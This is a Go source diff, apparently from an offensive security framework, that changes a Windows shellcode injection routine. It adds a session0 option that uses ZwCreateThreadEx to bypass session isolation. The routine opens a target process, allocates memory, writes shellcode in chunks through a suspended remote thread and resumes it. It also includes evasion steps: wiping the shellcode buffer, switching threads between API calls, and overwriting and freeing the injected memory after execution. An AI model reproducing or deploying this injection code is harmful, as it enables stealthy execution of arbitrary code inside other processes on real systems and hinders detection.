@@ -16,43 +16,50 @@ import (
 
 // InjectShellcode is used to inject shellcode to a process, it will block until execute finish.
 // chunkSize is the shellcode size that will be write by call WriteProcessMemory once.
+// if session0 is true, it will use ZwCreateThreadEx for bypass session isolation.
 // [Warning]: shellcode slice will be covered.
-func InjectShellcode(pid uint32, shellcode []byte, chunkSize int, wait, clean bool) error {
+func InjectShellcode(pid uint32, shellcode []byte, chunkSize int, session0, wait, clean bool) error {
 	defer security.CoverBytes(shellcode)
 	// ------------------------------------create remote thread------------------------------------
 	// open target process
 	doneOP := security.SwitchThreadAsync()
 	const da = windows.PROCESS_CREATE_THREAD | windows.PROCESS_QUERY_INFORMATION |
 		windows.PROCESS_VM_OPERATION | windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ
-	pHandle, err := api.OpenProcess(da, false, pid)
+	hProcess, err := api.OpenProcess(da, false, pid)
 	if err != nil {
 		return err
 	}
 	var processHandleClosed bool
 	defer func() {
 		if !processHandleClosed {
-			api.CloseHandle(pHandle)
+			api.CloseHandle(hProcess)
 		}
 	}()
 	// alloc memory for shellcode
 	doneVA := security.SwitchThreadAsync()
 	size := uintptr(len(shellcode))
 	const memType = windows.MEM_COMMIT | windows.MEM_RESERVE
-	memAddr, err := api.VirtualAllocEx(pHandle, 0, size, memType, windows.PAGE_NOACCESS)
+	memAddr, err := api.VirtualAllocEx(hProcess, 0, size, memType, windows.PAGE_NOACCESS)
 	if err != nil {
 		return err
 	}
 	// create remote thread first and suspend
 	doneCRT := security.SwitchThreadAsync()
-	const creationFlags = windows.CREATE_SUSPENDED
-	tHandle, _, err := api.CreateRemoteThread(pHandle, nil, 0, memAddr, nil, creationFlags)
+	var hThread windows.Handle
+	if session0 {
+		const creationFlags = 1 // resume thread
+		hThread, err = api.ZwCreateThreadEx(hProcess, nil, 0, memAddr, nil, creationFlags)
+	} else {
+		const creationFlags = windows.CREATE_SUSPENDED
+		hThread, _, err = api.CreateRemoteThread(hProcess, nil, 0, memAddr, nil, creationFlags)
+	}
 	if err != nil {
 		return err
 	}
 	var threadHandleClosed bool
 	defer func() {
 		if !threadHandleClosed {
-			api.CloseHandle(tHandle)
+			api.CloseHandle(hThread)
 		}
 	}()
 	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
@@ -63,7 +70,7 @@ func InjectShellcode(pid uint32, shellcode []byte, chunkSize int, wait, clean bo
 		chunkSize = 4
 	}
 	mw := memWriter{
-		pHandle:   pHandle,
+		hProcess:  hProcess,
 		memAddr:   memAddr,
 		memory:    shellcode,
 		size:      size,
@@ -76,22 +83,22 @@ func InjectShellcode(pid uint32, shellcode []byte, chunkSize int, wait, clean bo
 	security.CoverBytes(shellcode)
 	// -------------------------------------execute shellcode--------------------------------------
 	security.SwitchThread()
-	_, err = windows.ResumeThread(tHandle)
+	_, err = windows.ResumeThread(hThread)
 	if err != nil {
 		return errors.Wrap(err, "failed to resume thread")
 	}
 	// close process handle at once and reopen after execute finish
-	api.CloseHandle(pHandle)
+	api.CloseHandle(hProcess)
 	processHandleClosed = true
 	if wait { // wait thread for wait shellcode execute finish
 		security.SwitchThread()
-		_, err = windows.WaitForSingleObject(tHandle, windows.INFINITE)
+		_, err = windows.WaitForSingleObject(hThread, windows.INFINITE)
 		if err != nil {
 			return errors.Wrap(err, "failed to wait thread")
 		}
 	}
 	// close thread handle at once
-	api.CloseHandle(tHandle)
+	api.CloseHandle(hThread)
 	threadHandleClosed = true
 	// clean shellcode
 	if wait && clean {
@@ -106,28 +113,28 @@ func cleanShellcode(pid uint32, memAddr uintptr, size uintptr) error {
 	doneOP := security.SwitchThreadAsync()
 	const da = windows.PROCESS_QUERY_INFORMATION | windows.PROCESS_VM_OPERATION |
 		windows.PROCESS_VM_WRITE | windows.PROCESS_VM_READ
-	pHandle, err := api.OpenProcess(da, false, pid)
+	hProcess, err := api.OpenProcess(da, false, pid)
 	if err != nil {
 		return err
 	}
-	defer api.CloseHandle(pHandle)
+	defer api.CloseHandle(hProcess)
 	// clean shellcode and free it
 	doneVP := security.SwitchThreadAsync()
 	old := new(uint32)
-	err = api.VirtualProtectEx(pHandle, memAddr, size, windows.PAGE_READWRITE, old)
+	err = api.VirtualProtectEx(hProcess, memAddr, size, windows.PAGE_READWRITE, old)
 	if err != nil {
 		return err
 	}
 	// cover raw shellcode
 	doneWPM := security.SwitchThreadAsync()
 	rand := random.NewRand()
-	_, err = api.WriteProcessMemory(pHandle, memAddr, rand.Bytes(int(size)))
+	_, err = api.WriteProcessMemory(hProcess, memAddr, rand.Bytes(int(size)))
 	if err != nil {
 		return errors.WithMessage(err, "failed to cover shellcode to target process")
 	}
 	// free memory
 	doneVF := security.SwitchThreadAsync()
-	err = api.VirtualFreeEx(pHandle, memAddr, 0, windows.MEM_RELEASE)
+	err = api.VirtualFreeEx(hProcess, memAddr, 0, windows.MEM_RELEASE)
 	if err != nil {
 		return errors.Wrap(err, "failed to release covered memory")
 	}
